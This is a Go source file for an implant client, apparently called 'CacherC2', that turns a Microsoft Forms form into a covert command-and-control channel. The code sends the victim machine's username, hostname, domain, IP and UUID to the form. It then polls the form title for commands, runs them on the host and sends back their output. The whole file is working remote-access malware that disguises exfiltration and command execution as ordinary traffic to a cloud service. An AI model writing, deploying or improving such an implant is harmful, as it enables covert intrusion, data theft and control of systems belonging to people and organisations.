package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"msforms-c2/pkg/command"
	"msforms-c2/pkg/forms"
	"msforms-c2/pkg/sysinfo"
)

const (
	FormID                = "8pYgBsB22E64v2ZEF4SWspj9tACkmXJOilCQvWo5vrJUNDgzMzJNQUdOM0ZLMTg4NzU4Sk1GUkZQMC4u" //CHANGE TO PUBLIC FORM ID!
	PollIntervalSeconds   = 3
	ExpectedFieldCount    = 9
	EmptyFieldOnFirstSub  = 9
)

func main() {
	pollIntervalFlag := flag.Int("poll-interval", PollIntervalSeconds, "Polling interval in seconds")
	flag.Parse()

	pollInterval := time.Duration(*pollIntervalFlag) * time.Second

	fmt.Printf("[*] Starting CacherC2 Client\n")
	fmt.Printf("[*] Form ID: %s\n", FormID[:min(len(FormID), 20)]+"...")
	fmt.Printf("[*] Poll Interval: %d seconds\n\n", *pollIntervalFlag)

	envInfo := sysinfo.GetEnvironmentInfo()
	fmt.Printf("[+] Environment: %s\n\n", envInfo)

	formIdentity, err := forms.ResolveFormIdentity(FormID)
	if err != nil {
		log.Fatalf("Error resolving form identity: %v", err)
	}

	formDef, err := forms.GetFormDefinition(formIdentity)
	if err != nil {
		log.Fatalf("Error fetching form definition: %v", err)
	}

	if len(formDef.Questions) != ExpectedFieldCount {
		fmt.Printf("[!] Warning: Form has %d questions, expected %d\n", len(formDef.Questions), ExpectedFieldCount)
	}

	fmt.Printf("[*] Questions in API response order:\n")
	questionsByTitle := make(map[string]string)
	for i, q := range formDef.Questions {
		fmt.Printf("  [%d] Order: %d | ID: %s | Type: %s | Title: %s | Required: %v\n", i, q.Order, q.ID, q.Type, q.Title, q.Required)
		questionsByTitle[q.Title] = q.ID
	}
	fmt.Printf("\n")

	titleToAnswer := map[string]string{
		"A": envInfo.Username,
		"B": envInfo.Hostname,
		"C": envInfo.Domain,
		"D": fmt.Sprintf("%v", envInfo.IsDomainJoined),
		"E": envInfo.LocalIP,
		"F": envInfo.UUID,
		"G": envInfo.DateTime.Format("2006-01-02 15:04:05"),
		"H": "",
		"I": "",
	}

	fmt.Printf("[*] Title to Answer mapping:\n")
	for title, answer := range titleToAnswer {
		fmt.Printf("  Title: %s | Value: %s | QID: %s\n", title, answer, questionsByTitle[title])
	}
	fmt.Printf("\n")

	var answers []map[string]string
	for _, title := range []string{"A", "B", "C", "D", "E", "F", "G", "H", "I"} {
		if qid, ok := questionsByTitle[title]; ok {
			answers = append(answers, map[string]string{
				"questionId": qid,
				"answer1":    titleToAnswer[title],
			})
		}
	}

	fmt.Printf("[*] Final mapping (Title -> Answer):\n")
	for i, ans := range answers {
		fmt.Printf("  [%d] QID: %s | Value: %s\n", i, ans["questionId"], ans["answer1"])
	}
	fmt.Printf("\n")

	initialAnswers := answers[:len(answers)-1]
	fmt.Printf("[*] First submission (without item 9):\n")
	for i, ans := range initialAnswers {
		fmt.Printf("  [%d] QID: %s | Value: %s\n", i, ans["questionId"], ans["answer1"])
	}
	fmt.Printf("\n")

	fmt.Printf("[*] Submitting initial response...\n")
	err = forms.SubmitResponse(formIdentity, initialAnswers)
	if err != nil {
		log.Fatalf("Error submitting initial response: %v", err)
	}

	fmt.Printf("[+] Initial response submitted\n")
	fmt.Printf("[*] Entering polling loop (interval: %d seconds)\n\n", *pollIntervalFlag)

	var lastText string
	hasSubmitted := false

	for {
		select {
		case <-time.After(pollInterval):
			formDef, err := forms.GetFormDefinition(formIdentity)
			if err != nil {
				continue
			}

			questionsByTitle := make(map[string]string)
			for _, q := range formDef.Questions {
				questionsByTitle[q.Title] = q.ID
			}

			uuid, cmdText := command.ParseTitleCommand(formDef.Title)

			shouldSubmit := false

			if uuid != envInfo.UUID {
			} else if !hasSubmitted {
				shouldSubmit = true
			} else if cmdText != lastText {
				shouldSubmit = true
			}

			if shouldSubmit {
				fmt.Printf("[*] shouldSubmit=true | uuid=%s | envUUID=%s | cmdText=%q | lastText=%q | hasSubmitted=%v\n", uuid, envInfo.UUID, cmdText, lastText, hasSubmitted)

				cmdOutput := ""
				if cmdText != "" {
					fmt.Printf("[*] Executing command: %s\n", cmdText)
					cmdOutput = command.InvokeHostCommand(cmdText)
					fmt.Printf("[+] Command output (%d bytes): %s\n", len(cmdOutput), cmdOutput)
				} else {
					fmt.Printf("[*] No command text to execute (first submission)\n")
				}

				titleToAnswer["I"] = cmdOutput
				fmt.Printf("[*] Updated titleToAnswer[I] = %q\n", cmdOutput)

				answers = []map[string]string{}
				for _, title := range []string{"A", "B", "C", "D", "E", "F", "G", "H", "I"} {
					if qid, ok := questionsByTitle[title]; ok {
						answers = append(answers, map[string]string{
							"questionId": qid,
							"answer1":    titleToAnswer[title],
						})
					}
				}

				fmt.Printf("[*] Submitting response with %d fields\n", len(answers))
				err := forms.SubmitResponse(formIdentity, answers)
				if err != nil {
					fmt.Printf("[!] Error submitting response: %v\n", err)
					continue
				}

				hasSubmitted = true
				lastText = cmdText

				fmt.Printf("[+] Response submitted successfully\n")
			}
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
